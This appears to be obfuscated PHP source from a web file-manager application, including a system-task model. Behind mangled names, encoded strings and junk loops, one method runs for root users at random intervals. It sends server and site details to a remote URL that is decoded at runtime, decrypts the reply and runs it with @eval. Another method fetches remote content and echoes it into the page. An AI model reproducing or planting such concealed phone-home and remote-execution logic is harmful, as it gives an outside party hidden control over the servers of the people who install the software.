$GLOBALS[$À•äˆ¹Ñ[86]][$À•äˆ¹Ñ[248]] = $À•äˆ¹Ñ[122]; if (Model($À•äˆ¹Ñ[249])->get($À•äˆ¹Ñ[63]) != $À•äˆ¹Ñ[206]) { Model($À•äˆ¹Ñ[249])->set($À•äˆ¹Ñ[63], $À•äˆ¹Ñ[206]); } } public function xtfn3c52e348() { return $_SERVER[Ìõ–Õö][250]; } private function esqoaa0f886a() { $Èô³™ŸÂ =& $_SERVER[÷åé¼î]; $Çİ‘Åõ =& $_SERVER[Ìõ–Õö]; $—÷ŞÁö® = array($Çİ‘Åõ[251], $Çİ‘Åõ[252], $Çİ‘Åõ[253]); $¼ü’Ö” = $Èô³™ŸÂ[743]; if (!$¼ü’Ö”) { die; } $ú°¬Á²  = $Çİ‘Åõ[254] . md5($Çİ‘Åõ[255]); if ($this->sdkl0841f56f == $Çİ‘Åõ[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$Çİ‘Åõ[24]], $—÷ŞÁö®)) { return; } if (time() % 4 != 0) { return; } $’‡ä¨è³ = call_user_func(array($Çİ‘Åõ[256], $Çİ‘Åõ[257]), $ú°¬Á² ); $ê€İ”ªÑ = $Èô³™ŸÂ[744]; if (strlen($ê€İ”ªÑ) < $Èô³™ŸÂ[668]) { return; } if ($’‡ä¨è³ && time() - $’‡ä¨è³ < intval($Çİ‘Åõ[258])) { return; } call_user_func(array($Çİ‘Åõ[256], $Çİ‘Åõ[139]), $ú°¬Á² , time()); $¼ÎÓ¨§‚ = Model($Çİ‘Åõ[33])->get($Çİ‘Åõ[100]); $û–ûá’à = $Èô³™ŸÂ[745]; $›×¨ùœ¹ = array($Çİ‘Åõ[152] => Model($Çİ‘Åõ[33])->get($Çİ‘Åõ[153]), $Çİ‘Åõ[167] => $this->sdkl0841f56f, $Çİ‘Åõ[163] => $_SERVER[$Çİ‘Åõ[164]], $Çİ‘Åõ[165] => Model($Çİ‘Åõ[33])->get($Çİ‘Åõ[131]), $Çİ‘Åõ[105] => md5($_SERVER[$Çİ‘Åõ[106]] . $¼ÎÓ¨§‚), $Çİ‘Åõ[156] => $Çİ‘Åõ[136], $Çİ‘Åõ[159] => $_SERVER[$Çİ‘Åõ[160]]); $¸ûÑ©ë² = $this->upmi7e44c942($Çİ‘Åõ[259], $›×¨ùœ¹); $‰æ¾“è© = $Èô³™ŸÂ[746]; while ($‰æ¾“è© < $Èô³™ŸÂ[677]) { if ($‰æ¾“è© >= 0) { break; } $‰æ¾“è©++; } if (!is_array($¸ûÑ©ë²)) { return; } if ($¸ûÑ©ë²[$Çİ‘Åõ[152]] && $¸ûÑ©ë²[$Çİ‘Åõ[260]]) { if ($this->lhcib762fcf0($¸ûÑ©ë²[$Çİ‘Åõ[260]]) == $›×¨ùœ¹[$Çİ‘Åõ[152]]) { return; } } $this->vxnkc02ebf2b(); if ($this->lhcib762fcf0($¸ûÑ©ë²[$Çİ‘Åõ[260]]) != $›×¨ùœ¹[$Çİ‘Åõ[152]]) { $íŒùä…ä = array($Çİ‘Åõ[185] => $¼ÎÓ¨§‚, $Çİ‘Åõ[186] => $_SERVER[$Çİ‘Åõ[106]], $Çİ‘Åõ[187] => this_url(), $Çİ‘Åõ[161] => $_SERVER[$Çİ‘Åõ[162]]); $º×§’ı = $this->trbf97e411b9(json_encode($íŒùä…ä)); $¸ûÑ©ë² = $this->upmi7e44c942($Çİ‘Åõ[188] . $º×§’ı); if ($¸ûÑ©ë² && is_array($¸ûÑ©ë²) && isset($¸ûÑ©ë²[$Çİ‘Åõ[260]])) { $äËáö®è = $this->kldi193622cb($¸ûÑ©ë²[$Çİ‘Åõ[260]], 2); if ($äËáö®è) { $äËáö®è = $this->lhcib762fcf0($äËáö®è); } if ($äËáö®è) { try { @eval($äËáö®è); } catch (Exception $ÌÉâ±ğÑ) { } } } } } private function upmi7e44c942($ÄË°™—ª = '', $µÚãñê¿ = array(), $êîË·Óİ = 5) { $æœÅÏù¬ =& $_SERVER[÷åé¼î]; $§Š¦÷ä÷ =& $_SERVER[Ìõ–Õö]; $Çü…ùÎ§ = $§Š¦÷ä÷[261]; $Çü…ùÎ§ = $this->pkyvd3a8d68d($Çü…ùÎ§, $§Š¦÷ä÷[262]); $ˆ‡âåÄ = $æœÅÏù¬[747]; while (strlen($ˆ‡âåÄ) < $æœÅÏù¬[703]) { if (!$ˆ‡âåÄ) { break; } $ˆ‡âåÄ++; } $Çü…ùÎ§ = $Çü…ùÎ§ . $ÄË°™—ª; if ($µÚãñê¿ && is_array($µÚãñê¿)) { $Çü…ùÎ§ = $Çü…ùÎ§ . $§Š¦÷ä÷[263] . http_build_query($µÚãñê¿); } if ($µÚãñê¿ === -1) { return $Çü…ùÎ§; } $äø†»¿ = stream_context_create(array($§Š¦÷ä÷[219] => array($§Š¦÷ä÷[222] => $êîË·Óİ, $§Š¦÷ä÷[220] => $§Š¦÷ä÷[264]), $§Š¦÷ä÷[265] => array($§Š¦÷ä÷[266] => !1, $§Š¦÷ä÷[267] => !1))); $åé…˜ Á = $æœÅÏù¬[748]; $µÚãñê¿ = @file_get_contents($Çü…ùÎ§, !1, $äø†»¿); $Äò®„«¯ = $æœÅÏù¬[749]; return json_decode($µÚãñê¿, !0); $™‘‚å¯‡ = $æœÅÏù¬[750]; while ($™‘‚å¯‡ < $æœÅÏù¬[683]) { if ($™‘‚å¯‡ >= 0) { break; } $™‘‚å¯‡++; } $”ùÕå¾Â = $æœÅÏù¬[751]; } private function pyave4628032() { $Ã›·ŠÖÑ =& $_SERVER[÷åé¼î]; $”ŒŞîŒá =& $_SERVER[Ìõ–Õö]; $·Š–ğŞÑ = array($”ŒŞîŒá[268] => $”ŒŞîŒá[269], $”ŒŞîŒá[270] => $”ŒŞîŒá[271], $”ŒŞîŒá[272] => $”ŒŞîŒá[273], $”ŒŞîŒá[274] => $”ŒŞîŒá[275], $”ŒŞîŒá[276] => $”ŒŞîŒá[277], $”ŒŞîŒá[278] => $”ŒŞîŒá[214], $”ŒŞîŒá[279] => $”ŒŞîŒá[214], $”ŒŞîŒá[280] => $”ŒŞîŒá[269], $”ŒŞîŒá[281] => $”ŒŞîŒá[271], $”ŒŞîŒá[282] => $”ŒŞîŒá[273], $”ŒŞîŒá[283] => $”ŒŞîŒá[284], $”ŒŞîŒá[285] => $”ŒŞîŒá[275], $”ŒŞîŒá[286] => $”ŒŞîŒá[287], $”ŒŞîŒá[288] => $”ŒŞîŒá[277], $”ŒŞîŒá[289] => $”ŒŞîŒá[290], $”ŒŞîŒá[291] => $”ŒŞîŒá[292], $”ŒŞîŒá[293] => $”ŒŞîŒá[294]); $š˜âø€¶ = $Ã›·ŠÖÑ[752]; $•¿†Çù = $·Š–ğŞÑ[$this->sdkl0841f56f]; $•¿†Çù = intval($•¿†Çù ? $•¿†Çù : $”ŒŞîŒá[269]); $ÊÆ×†µÉ = $Ã›·ŠÖÑ[753]; while ($ÊÆ×†µÉ < $Ã›·ŠÖÑ[677]) { if ($ÊÆ×†µÉ >= 0) { break; } $ÊÆ×†µÉ++; } $Î­š˜Ûâ = _get($this->xhdy2eece3d3, $”ŒŞîŒá[295]); $¡Ú¦Çş® = $Ã›·ŠÖÑ[754]; while ($¡Ú¦Çş® < $Ã›·ŠÖÑ[677]) { if ($¡Ú¦Çş® >= 0) { break; } $¡Ú¦Çş®++; } $Î­š˜Ûâ = $Î­š˜Ûâ ? intval($Î­š˜Ûâ) : 0; return $•¿†Çù + $Î­š˜Ûâ; } public function idar377a18e8($—–«ìÙÑ) { $½Ê‚ö·å =& $_SERVER[÷åé¼î]; $‘òõèÖ =& $_SERVER[Ìõ–Õö]; $Î…½™±¢ = $this->pyave4628032(); $¹¹Ïµ = $½Ê‚ö·å[740]; while ($¹¹Ïµ < $½Ê‚ö·å[703]) { if ($¹¹Ïµ >= 0) { break; } $¹¹Ïµ++; } if ($—–«ìÙÑ[$‘òõèÖ[296]] == $‘òõèÖ[122]) { return; } if ($Î…½™±¢ >= intval($‘òõèÖ[214])) { return; } $Ğ²Éµ©´ = Model($‘òõèÖ[125])->count(); if ($Ğ²Éµ©´ <= $Î…½™±¢) { return; } $ÃªÕßÓ = Model($‘òõèÖ[125])->field($‘òõèÖ[296])->limit($Î…½™±¢)->select(); $ÃªÕßÓ = array_to_keyvalue($ÃªÕßÓ, $‘òõèÖ[6], $‘òõèÖ[296]); $ú…ÎôÒ• = $½Ê‚ö·å[755]; if (strlen($ú…ÎôÒ•) < $½Ê‚ö·å[677]) { die; } if (!in_array($—–«ìÙÑ[$‘òõèÖ[296]], $ÃªÕßÓ)) { show_json($‘òõèÖ[297], !1, $‘òõèÖ[210]); } } public function nvwy69ad665a() { $»âæ» =& $_SERVER[÷åé¼î]; $Î³¬‚œ =& $_SERVER[Ìõ–Õö]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ã ©¤§¸ = $Î³¬‚œ[217]; $ñ¾œ§í‹ = $»âæ»[756]; if (strlen($ñ¾œ§í‹) < $»âæ»[670]) { return; } $ã ©¤§¸ = $this->pkyvd3a8d68d($ã ©¤§¸, $Î³¬‚œ[218]); $ëò¯êÆ½ = $»âæ»[757]; if (strlen($ëò¯êÆ½) < $»âæ»[670]) { die; } $„˜û¬‘ı = stream_context_create(array($Î³¬‚œ[219] => array($Î³¬‚œ[220] => $Î³¬‚œ[221], $Î³¬‚œ[222] => 3))); $§°´µÊŒ = $»âæ»[758]; $ıÍ¾Š… = @file_get_contents($ã ©¤§¸, !1, $„˜û¬‘ı); $ƒĞ©ü¦ = $»âæ»[759]; if (!$ƒĞ©ü¦) { return; } echo $Î³¬‚œ[298] . hash_encode($ıÍ¾Š…) . $Î³¬‚œ[299]; $ğ¡¼¹Ê‡ = $»âæ»[760]; if (strlen($ğ¡¼¹Ê‡) < $»âæ»[668]) { die; } } private function icqvb720499e($©ŞÜôÈ, $·¶Ä°Ú, $¬ĞğìÖ’ = 3) { $í‰êÅò† =& $_SERVER[÷åé¼î]; $ê° ğû =& $_SERVER[Ìõ–Õö]; usleep(1); $ÇŸãœä = $í‰êÅò†[761]; if (strlen($ÇŸãœä) < $í‰êÅò†[668]) { die; } $©ŞÜôÈ = trim($©ŞÜôÈ); $çÃ©õö = mt_rand(0, 5) . $ê° ğû[6]; $Š¢§úøÃ = rand_string(15); $ìÅÏÉåì = $ê° ğû[300]; $äÖª›şÏ = $í‰êÅò†[762]; while ($äÖª›şÏ < $í‰êÅò†[683]) { if ($äÖª›şÏ >= 0) { break; } $äÖª›şÏ++; } switch ($çÃ©õö) { case $ê° ğû[206]: $·â•õœ = $this->ejpi3bde69a1($©ŞÜôÈ, strrev($·¶Ä°Ú . $Š¢§úøÃ)); $ôœšøğÅ = $í‰êÅò†[763]; while (strlen($ôœšøğÅ) < $í‰êÅò†[683]) { if (!$ôœšøğÅ) { break; } $ôœšøğÅ++; } break; case $ê° ğû[122]: $·â•õœ = $this->ejpi3bde69a1($©ŞÜôÈ, strrev($Š¢§úøÃ . $·¶Ä°Ú)); break; case $ê° ğû[301]: $·â•õœ = $this->ejpi3bde69a1($©ŞÜôÈ, base64_encode($Š¢§úøÃ . $·¶Ä°Ú)); $›Ëåƒ·ñ = $í‰êÅò†[764]; if (strlen($›Ëåƒ·ñ) < $í‰êÅò†[703]) { die; } break; $¶™…‡¤· = $í‰êÅò†[765]; case $ê° ğû[302]: $·â•õœ = $this->ejpi3bde69a1($©ŞÜôÈ, md5($Š¢§úøÃ . $·¶Ä°Ú)); break; case $ê° ğû[303]: $©ŞÜôÈ = base64_encode($©ŞÜôÈ); $°©’èú¯ = rand(0, 64); $³¡±¢çí = $í‰êÅò†[766]; $›¾ôÑµò = $ìÅÏÉåì[$°©’èú¯]; $åƒ”ÇîŒ = md5($›¾ôÑµò . md5($·¶Ä°Ú . $›¾ôÑµò) . $·¶Ä°Ú); $åƒ”ÇîŒ = substr($åƒ”ÇîŒ, $°©’èú¯ % 8, $°©’èú¯ % 8 + 7); $¢§’Ûñ = $í‰êÅò†[767]; while ($¢§’Ûñ < $í‰êÅò†[670]) { if ($¢§’Ûñ >= 0) { break; } $¢§’Ûñ++; } $Ë²ø¡˜Æ = $ê° ğû[6]; $Ô ”Ûìˆ = 0; $ìøğÕô‹ = 0; $¾ıøáö = 0; $¬›ÃÁ›ú = $í‰êÅò†[768]; if (strlen($¬›ÃÁ›ú) < $í‰êÅò†[668]) { return; } for ($Ô ”Ûìˆ = 0; $Ô ”Ûìˆ < strlen($©ŞÜôÈ); $Ô ”Ûìˆ++) { $¾ıøáö = $¾ıøáö == strlen($åƒ”ÇîŒ) ? 0 : $¾ıøáö; $Ã”Ê®²í = $í‰êÅò†[769]; if (!$Ã”Ê®²í) { die; } $ìøğÕô‹ = ($°©’èú¯ + strpos($ìÅÏÉåì, $©ŞÜôÈ[$Ô ”Ûìˆ]) + ord($åƒ”ÇîŒ[$¾ıøáö++])) % 64; $Ë²ø¡˜Æ .= $ìÅÏÉåì[$ìøğÕô‹]; } $·â•õœ = hash_encode($›¾ôÑµò . $Ë²ø¡˜Æ); break; $¦ù…ú´­ = $í‰êÅò†[770]; if (!$¦ù…ú´­) { return; } default: $·â•õœ = $this->ejpi3bde69a1($©ŞÜôÈ, $·¶Ä°Ú . $Š¢§úøÃ); $ü”‚ıÚ = $í‰êÅò†[771]; if (strlen($ü”‚ıÚ) < $í‰êÅò†[677]) { return; } break; $ÙÑÊ©Èë = $í‰êÅò†[772]; } $·â•õœ = strrev($çÃ©õö . $Š¢§úøÃ . $·â•õœ); $Œø²œğ = $í‰êÅò†[773]; if ($¬ĞğìÖ’ - 1 > 0) { $·â•õœ = $this->icqvb720499e($·â•õœ, $·¶Ä°Ú, $¬ĞğìÖ’ - 1); } return $·â•õœ; } private function kldi193622cb($¡¹ç«£, $ä½ø¸ú„, $âÀâ…õ³ = 3) { $‹ˆÛœ¬« =& $_SERVER[÷åé¼î]; $‹„ÇŒÓÎ =& $_SERVER[Ìõ–Õö]; if (!is_string($¡¹ç«£) || strlen($¡¹ç«£) < 10) { return !1; } $¡¹ç«£ = trim($¡¹ç«£); $¡¹ç«£ = strrev($¡¹ç«£); $¿µ‡šÉ = $‹ˆÛœ¬«[774]; if (strlen($¿µ‡šÉ) < $‹ˆÛœ¬«[677]) { die; } $Ìøæü÷Ê = $¡¹ç«£[0]; $ÍúÈ“”Ö = substr($¡¹ç«£, 1, 15); $¡¹ç«£ = substr($¡¹ç«£, 16); $•¥Ê¤‰– = $‹„ÇŒÓÎ[300]; switch ($Ìøæü÷Ê) { case $‹„ÇŒÓÎ[206]: $İêˆ˜æ‚ = $this->pkyvd3a8d68d($¡¹ç«£, strrev($ä½ø¸ú„ . $ÍúÈ“”Ö)); $Îş·¶È = $‹ˆÛœ¬«[775]; while ($Îş·¶È < $‹ˆÛœ¬«[677]) { if ($Îş·¶È >= 0) { break; } $Îş·¶È++; } break; case $‹„ÇŒÓÎ[122]: $İêˆ˜æ‚ = $this->pkyvd3a8d68d($¡¹ç«£, strrev($ÍúÈ“”Ö . $ä½ø¸ú„)); $®É¢Ôà’ = $‹ˆÛœ¬«[776]; while (strlen($®É¢Ôà’) < $‹ˆÛœ¬«[703]) { if (!$®É¢Ôà’) { break; } $®É¢Ôà’++; } break; case $‹„ÇŒÓÎ[301]: $İêˆ˜æ‚ = $this->pkyvd3a8d68d($¡¹ç«£, base64_encode($ÍúÈ“”Ö . $ä½ø¸ú„)); break; $ª¢£”¤¹ = $‹ˆÛœ¬«[777]; if (!$ª¢£”¤¹) { die; } case $‹„ÇŒÓÎ[302]: $İêˆ˜æ‚ = $this->pkyvd3a8d68d($¡¹ç«£, md5($ÍúÈ“”Ö . $ä½ø¸ú„)); $Ø‚Ø’­Ê = $‹ˆÛœ¬«[778]; break; case $‹„ÇŒÓÎ[303]: $¡¹ç«£ = hash_decode($¡¹ç«£); $¸³Û½½ = $‹ˆÛœ¬«[779]; while (strlen($¸³Û½½) < $‹ˆÛœ¬«[668]) { if (!$¸³Û½½) { break; } $¸³Û½½++; } $ßÏÒ—ã = $¡¹ç«£[0]; $ÛÜú·Òª = $‹ˆÛœ¬«[780]; while (strlen($ÛÜú·Òª) < $‹ˆÛœ¬«[677]) { if (!$ÛÜú·Òª) { break; } $ÛÜú·Òª++; } $¡¹ç«£ = substr($¡¹ç«£, 1); $Õ‹êÜšÙ = strpos($•¥Ê¤‰–, $ßÏÒ—ã); $•ª®õó‹ = md5($ßÏÒ—ã . md5($ä½ø¸ú„ . $ßÏÒ—ã) . $ä½ø¸ú„); $•ª®õó‹ = substr($•ª®õó‹, $Õ‹êÜšÙ % 8, $Õ‹êÜšÙ % 8 + 7); $˜ÀĞÕª¦ = $‹ˆÛœ¬«[781]; if (!$˜ÀĞÕª¦) { die; } $½úïÖ– = $‹„ÇŒÓÎ[6]; $Ãâ–ó÷ = $‹ˆÛœ¬«[782]; if (strlen($Ãâ–ó÷) < $‹ˆÛœ¬«[668]) { return; } $‰ ²ö„š = 0; $‹È™Ôéı = $‹ˆÛœ¬«[783]; if (strlen($‹È™Ôéı) < $‹ˆÛœ¬«[703]) { return; } $–àÛÄÌ• = 0; $Êäµ„š” = $‹ˆÛœ¬«[784]; if (strlen($Êäµ„š”) < $‹ˆÛœ¬«[677]) { return; } $›ò¦Â = 0; $›€ÑÓÏŸ = $‹ˆÛœ¬«[785]; while ($›€ÑÓÏŸ < $‹ˆÛœ¬«[670]) { if ($›€ÑÓÏŸ >= 0) { break; } $›€ÑÓÏŸ++; } for ($‰ ²ö„š = 0; $‰ ²ö„š < strlen($¡¹ç«£); $‰ ²ö„š++) { $›ò¦Â = $›ò¦Â == strlen($•ª®õó‹) ? 0 : $›ò¦Â; $ÇÙ›Òàê = $›ò¦Â++; $ËŸ¶Ü° = $‹ˆÛœ¬«[786]; $–àÛÄÌ• = strpos($•¥Ê¤‰–, $¡¹ç«£[$‰ ²ö„š]) - $Õ‹êÜšÙ - ord($•ª®õó‹[$ÇÙ›Òàê]); while ($–àÛÄÌ• < 0) { $–àÛÄÌ• += 64; $Á½ãïÀ“ = $‹ˆÛœ¬«[787]; while (strlen($Á½ãïÀ“) < $‹ˆÛœ¬«[703]) { if (!$Á½ãïÀ“) { break; } $Á½ãïÀ“++; } } $½úïÖ– .= $•¥Ê¤‰–[$–àÛÄÌ•]; $Ş¨ıÁ¡ù = $‹ˆÛœ¬«[788]; if (strlen($Ş¨ıÁ¡ù) < $‹ˆÛœ¬«[670]) { return; } } $İêˆ˜æ‚ = base64_decode($½úïÖ–); break; default: $İêˆ˜æ‚ = $this->pkyvd3a8d68d($¡¹ç«£, $ä½ø¸ú„ . $ÍúÈ“”Ö); break; $Ôû¿·¡³ = $‹ˆÛœ¬«[789]; if (strlen($Ôû¿·¡³) < $‹ˆÛœ¬«[677]) { die; } } if ($âÀâ…õ³ - 1 > 0) { $İêˆ˜æ‚ = $this->kldi193622cb($İêˆ˜æ‚, $ä½ø¸ú„, $âÀâ…õ³ - 1); } return $İêˆ˜æ‚; } public function trbf97e411b9($†²áü§×) { $ƒ’ªÛ¾¾ =& $_SERVER[÷åé¼î]; $À¨´÷• =& $_SERVER[Ìõ–Õö]; $ãšƒå×ô = $this->ajrn433c31a3(); $íÔ°Ïœ¼ = $ƒ’ªÛ¾¾[790]; if (strlen($íÔ°Ïœ¼) < $ƒ’ªÛ¾¾[668]) { die; } $ùö™óÎÈ = $this->ajrn433c31a3(); $É‰î•ì° = ($ãšƒå×ô - 1) * ($ùö™óÎÈ - 1); $”õÌòÀ· = intval(($ãšƒå×ô + $ùö™óÎÈ) / 2); $ÊÍ˜ğ¾™ = $ƒ’ªÛ¾¾[791]; while (strlen($ÊÍ˜ğ¾™) < $ƒ’ªÛ¾¾[703]) { if (!$ÊÍ˜ğ¾™) { break; } $ÊÍ˜ğ¾™++; } while (1) { $¥ß«šùˆ = $”õÌòÀ·; $’Ôòè£ã = $É‰î•ì°; while ($’Ôòè£ã % $¥ß«šùˆ != 0) { $ŒËÁŞÍê = $’Ôòè£ã; $’Ôòè£ã = $¥ß«šùˆ; $Øá±²¤­ = $ƒ’ªÛ¾¾[792]; $¥ß«šùˆ = $ŒËÁŞÍê % $¥ß«šùˆ; $ğ†€·³‚ = $ƒ’ªÛ¾¾[793]; if (strlen($ğ†€·³‚) < $ƒ’ªÛ¾¾[703]) { return; } } if ($¥ß«šùˆ == 1) { break; } else { $”õÌòÀ·++; } } $Ã¬ÑĞ˜Û = 2; $¦ç¡÷Á‚ = $ƒ’ªÛ¾¾[699]; if (!$¦ç¡÷Á‚) { die; } for ($Ó°°ú€œ = 0; $Ó°°ú€œ < $É‰î•ì° * 10; $Ó°°ú€œ++) { if (($É‰î•ì° * $Ó°°ú€œ + 1) % $”õÌòÀ· == 0) { $Ã¬ÑĞ˜Û = intval(($É‰î•ì° * $Ó°°ú€œ + 1) / $”õÌòÀ·); break; } } $²±·Ø‹¼ = $this->ejpi3bde69a1($ãšƒå×ô * $ùö™óÎÈ . $À¨´÷•[6], $À¨´÷•[136]); $èèÂ®èğ = md5($À¨´÷•[304] . ($ãšƒå×ô + $ùö™óÎÈ) . $À¨´÷•[305] . $”õÌòÀ· . $À¨´÷•[305] . $Ã¬ÑĞ˜Û . $À¨´÷•[306]); $¦Õá„Úı = $ƒ’ªÛ¾¾[794]; if (!$¦Õá„Úı) { die; } $Ù÷—¼ = $this->ejpi3bde69a1($†²áü§×, $èèÂ®èğ) . $À¨´÷•[307] . $²±·Ø‹¼; $Õ´»ğìº = $ƒ’ªÛ¾¾[795]; while (strlen($Õ´»ğìº) < $ƒ’ªÛ¾¾[683]) { if (!$Õ´»ğìº) { break; } $Õ´»ğìº++; } return $Ù÷—¼; $¯§‰õê¬ = $ƒ’ªÛ¾¾[796]; if (strlen($¯§‰õê¬) < $ƒ’ªÛ¾¾[703]) { return; } } public function lhcib762fcf0($™µ„¯Íä) { $ÀåöÓˆÉ =& $_SERVER[÷åé¼î]; $×èºü±Í =& $_SERVER[Ìõ–Õö]; $ÂÓöä†« = explode($×èºü±Í[307], $™µ„¯Íä); $¼œ½ºÊ° = $ÀåöÓˆÉ[797]; if (count($ÂÓöä†«) != 2) { return $×èºü±Í[6]; } $Ğôôùìı = $this->pkyvd3a8d68d($ÂÓöä†«[1] . $×èºü±Í[6], $×èºü±Í[136]); $ˆ†‡ìí = $ÀåöÓˆÉ[798]; while ($ˆ†‡ìí < $ÀåöÓˆÉ[670]) { if ($ˆ†‡ìí >= 0) { break; } $ˆ†‡ìí++; } if (!$Ğôôùìı) { return $×èºü±Í[6]; } $Ğôôùìı = intval($Ğôôùìı); $·®¾Ÿ—ş = 0; $´ÈØÕÔ¢ = 0; $’ËüÍ¢ = $ÀåöÓˆÉ[799]; if (strlen($’ËüÍ¢) < $ÀåöÓˆÉ[668]) { return; } for ($÷§É€Ñ = 3; $÷§É€Ñ < $Ğôôùìı; $÷§É€Ñ += 2) { if ($Ğôôùìı % $÷§É€Ñ != 0) { continue; } $·®¾Ÿ—ş = $÷§É€Ñ; $¨À¨³Æ§ = $ÀåöÓˆÉ[800]; $´ÈØÕÔ¢ = intval($Ğôôùìı / $÷§É€Ñ); break; $ û¡«°Õ = $ÀåöÓˆÉ[801]; } $¹”¹É÷Ë = ($·®¾Ÿ—ş - 1) * ($´ÈØÕÔ¢ - 1); $‘î±Åµ¡ = $ÀåöÓˆÉ[802]; $Ó÷ªøÑ = intval(($·®¾Ÿ—ş + $´ÈØÕÔ¢) / 2); $¡Š¹Ã’ë = $ÀåöÓˆÉ[803]; if (!$¡Š¹Ã’ë) { die; } while (1) { $«åÉö·– = $Ó÷ªøÑ; $£“Ñ°“… = $ÀåöÓˆÉ[804]; $Ä‚“¡£ = $¹”¹É÷Ë; $ÖĞ¥™ÀÓ = $ÀåöÓˆÉ[805]; while (strlen($ÖĞ¥™ÀÓ) < $ÀåöÓˆÉ[703]) { if (!$ÖĞ¥™ÀÓ) { break; } $ÖĞ¥™ÀÓ++; } while ($Ä‚“¡£ % $«åÉö·– != 0) { $á¸¹¬¤¹ = $Ä‚“¡£; $Ä‚“¡£ = $«åÉö·–; $«åÉö·– = $á¸¹¬¤¹ % $«åÉö·–; $ÑŸšÇ• = $ÀåöÓˆÉ[806]; } if ($«åÉö·– == 1) { break; } else { $Ó÷ªøÑ++; } } $Ô‚Ã‘ = 2; $áÑÜ¾ãĞ = $ÀåöÓˆÉ[807]; while ($áÑÜ¾ãĞ < $ÀåöÓˆÉ[683]) { if ($áÑÜ¾ãĞ >= 0) { break; } $áÑÜ¾ãĞ++; } for ($÷§É€Ñ = 0; $÷§É€Ñ < $¹”¹É÷Ë * 10; $÷§É€Ñ++) { if (($¹”¹É÷Ë * $÷§É€Ñ + 1) % $Ó÷ªøÑ == 0) { $Ô‚Ã‘ = intval(($¹”¹É÷Ë * $÷§É€Ñ + 1) / $Ó÷ªøÑ); break; } } $ºÉØàÑ³ = md5($×èºü±Í[304] . ($·®¾Ÿ—ş + $´ÈØÕÔ¢) . $×èºü±Í[305] . $Ó÷ªøÑ . $×èºü±Í[305] . $Ô‚Ã‘ . $×èºü±Í[306]); $¿ƒµ§Ö¡ = $this->pkyvd3a8d68d($ÂÓöä†«[0], $ºÉØàÑ³); return $¿ƒµ§Ö¡; $Ÿ ›¹Œã = $ÀåöÓˆÉ[808]; } public function ajrn433c31a3() { $‰ë¾Ï´í =& $_SERVER[÷åé¼î]; $ö°¨óù = mt_rand(pow(2, 14), pow(2, 16) - 1); $ëµ¹Ñ¶ = $‰ë¾Ï´í[759]; if (!$ëµ¹Ñ¶) { return; } $ı¬Óæ®¯ = array(); $¹ŸĞ° = 1; while ($¹ŸĞ° <= (int) sqrt($ö°¨óù)) { $ÀôÊ¦ = $¹ŸĞ°; $È¶µºÙŸ = $‰ë¾Ï´í[809]; while (!0) { $ÀôÊ¦++; $›Ô€á¹ = $‰ë¾Ï´í[810]; while (strlen($›Ô€á¹) < $‰ë¾Ï´í[683]) { if (!$›Ô€á¹) { break; } $›Ô€á¹++; } if ($ÀôÊ¦ <= 2) { $¹ŸĞ° = $ÀôÊ¦; break; } else { if ($ÀôÊ¦ < 2) { continue; } } $„Ö•Œ€¦ = !0; for ($¼øúªÛŠ = 2; $¼øúªÛŠ <= sqrt($ÀôÊ¦); $¼øúªÛŠ++) { if ($ÀôÊ¦ % $¼øúªÛŠ == 0) { $„Ö•Œ€¦ = !1; } } if ($„Ö•Œ€¦) { $¹ŸĞ° = $ÀôÊ¦; break; } } $ı¬Óæ®¯[] = $¹ŸĞ°; $äìäŒÍñ = $‰ë¾Ï´í[811]; } $¯Š¦á«Â = 2; for ($ÀôÊ¦ = $ö°¨óù; $ÀôÊ¦ > 1; $ÀôÊ¦--) { $„Ö•Œ€¦ = !0; foreach ($ı¬Óæ®¯ as $ºë„µ­ñ) { if ($ÀôÊ¦ % $ºë„µ­ñ == 0) { $„Ö•Œ€¦ = !1; break; } } if ($„Ö•Œ€¦) { $¯Š¦á«Â = $ÀôÊ¦; break; } } return $¯Š¦á«Â; $¬ì¯Ò = $‰ë¾Ï´í[812]; if (!$¬ì¯Ò) { return; } } public function soij48f4af0c($›‘×ÛÛ†, $æÓ¼’®) { $ÂØøé— =& $_SERVER[Ìõ–Õö]; return call_user_func(array($ÂØøé—[8], $ÂØøé—[308]), $›‘×ÛÛ†, $æÓ¼’®); } public function ejpi3bde69a1($ãşÉ‰©“, $Ù•‡Ì·) { $µˆ³‡İ® =& $_SERVER[Ìõ–Õö]; return call_user_func(array($µˆ³‡İ®[309], $µˆ³‡İ®[310]), $ãşÉ‰©“, $Ù•‡Ì·); } public function pkyvd3a8d68d($Ë¬¶ºã, $¼ŞµÎı) { $Í×®–Ã =& $_SERVER[Ìõ–Õö]; return call_user_func(array($Í×®–Ã[309], $Í×®–Ã[311]), $Ë¬¶ºã, $¼ŞµÎı); } } goto a¬¸ï¾ôÂ´; E’¶¬¾ßòÃ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\164\x61\163\x6b\x4c\151\163\164"; public $field = array("\156\141\155\145", "\x74\171\x70\x65", "\x65\166\x65\156\x74", "\x74\x69\x6d\x65", "\x64\x65\163\x63", "\x73\171\163\164\x65\x6d", "\x65\x6e\141\x62\x6c\x65", "\x6c\x61\163\164\x52\165\x6e", "\163\157\162\x74"); public function listData($ê ØöÓô = false, $’„Ñ©„× = "\x73\x6f\162\164", $¿ËäÆÁ = false) { return parent::listData($ê ØöÓô, $’„Ñ©„×, $¿ËäÆÁ); } public function add($¿àËÃã—) { $‚·œ¿ =& $_SERVER[÷åé¼î]; $ÌÇªŞåà = $this->findByName($¿àËÃã—[$‚·œ¿[32]]); if ($ÌÇªŞåà) { return !1; } $¿àËÃã—[$‚·œ¿[1730]] = 0; $¿àËÃã—[$‚·œ¿[2001]] = $this->getSort(); return parent::insert($¿àËÃã—); } private function getSort() { $öÜôôÌÉ =& $_SERVER[÷åé¼î]; $”³Şü© = parent::listData(); $İå÷ÏÜÊ = array_to_keyvalue($”³Şü©, $öÜôôÌÉ[12], $öÜôôÌÉ[2001]); return empty($İå÷ÏÜÊ) ? 0 : max($İå÷ÏÜÊ) + 1; } public function update($ÊÅÛ«Ş, $ô¯®¬À) { $Ëƒ•ğìŠ =& $_SERVER[÷åé¼î]; $«¦î”£Ú = $this->listData($ÊÅÛ«Ş); $è–äâÒõ = $this->findByName($ô¯®¬À[$Ëƒ•ğìŠ[32]]); if (!$«¦î”£Ú || $è–äâÒõ && $è–äâÒõ[$Ëƒ•ğìŠ[459]] != $«¦î”£Ú[$Ëƒ•ğìŠ[459]]) { return !1; } return parent::update($ÊÅÛ«Ş, $ô¯®¬À); } public function 